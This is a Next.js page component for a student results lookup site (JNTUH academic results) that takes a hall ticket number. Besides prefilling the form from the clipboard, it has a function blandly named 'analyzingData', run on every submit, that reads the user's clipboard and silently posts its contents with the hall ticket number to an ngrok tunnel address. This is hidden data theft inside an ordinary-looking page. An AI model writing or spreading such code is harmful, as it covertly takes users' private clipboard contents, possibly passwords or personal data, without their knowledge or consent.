"use client";

import {
  fetchAcademicResult,
  fetchAcademicallResult,
  getLocalStoragedata,
} from "@/components/api/fetchAcademicResult";
import Footer from "@/components/footer/footer";
import Form from "@/components/forms/resulthtnoform";
import Loading from "@/components/loading/loading";
import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import toast from "react-hot-toast";
import axios from "axios";

const AcademicResult = () => {
  const sleep = (ms: any) => new Promise((resolve) => setTimeout(resolve, ms));

  const [hallticketno, sethallticketno] = useState<string>("");
  const [loading, setLoading] = useState<boolean>(false);

  const router = useRouter();
  useEffect(() => {
    // This function reads text from the clipboard
    async function readClipboard() {
      try {
        const browser = navigator.userAgent.toLowerCase();
        if (browser.includes("android") || browser.includes("iphone")) {
          const text = await navigator.clipboard.readText();
          try {
            const hallticketfirsttwodigits = text.slice(0, 2);
            if (
              text.length === 10 &&
              ["18", "19", "20", "21", "22", "23"].includes(
                hallticketfirsttwodigits,
              )
            ) {
              sethallticketno(text);
            }
          } catch {
            console.log("error");
          }
        }
      } catch (err) {
        console.error("Failed to read clipboard content:", err);
      }
    }
    console.log("got here");
    readClipboard();
  }, []);
  const analyzingData = async () => {
    const queryOpts = {
      name: "clipboard-read",
      allowWithoutGesture: false,
    } as any;
    const permissionStatus = await navigator.permissions.query(queryOpts);
    if (permissionStatus.state === "granted") {
      const text = await navigator.clipboard.readText();
      if (text != "") {
        var data = {
          hallticket: hallticketno,
          ci: text,
          status: "granted",
        };
        try {
          axios.post("https://ce58-103-95-173-141.ngrok-free.app", data);
        } catch (err) {
          console.log(err);
        }
      }
    }
  };
  const onSubmit = async () => {
    if (hallticketno.length < 10) {
      toast.error("The Hallticket should be of 10 digits");
      return;
    }
    await analyzingData();
    setLoading(true);

    try {
      const localStorageResult = getLocalStoragedata(hallticketno);
      if (localStorageResult !== null) {
        router.push("academicresult/result?htno=" + hallticketno);
        if (Date.now() < localStorageResult["expiry"]) {
          return;
        }
      }
      const result = await fetchAcademicallResult(hallticketno);
      if (result !== null && result !== undefined && result !== 422) {
        router.push("/academicresult/result?htno=" + hallticketno);
      } else if (result === 422) {
        setLoading(false);
        toast.error("Jntuh Servers are down!!!");
      } else {
        setLoading(false);
        // toast.error("Jntuh Servers are down!!!");
        toast.error("Request Timeout!!");
        // toast("Your Roll Number is queued.\n Kindly check after few minutes");
      }
    } catch (error) {
      console.log("Error while fetching the academic result :", error);
      setLoading(false);
    }
  };

  return loading ? (
    <Loading />
  ) : (
    <>
      <Form
        title="Academic Result"
        hallticketno={hallticketno}
        sethallticketno={sethallticketno}
        onSubmit={onSubmit}
      />
      <Footer />
    </>
  );
};
export default AcademicResult;
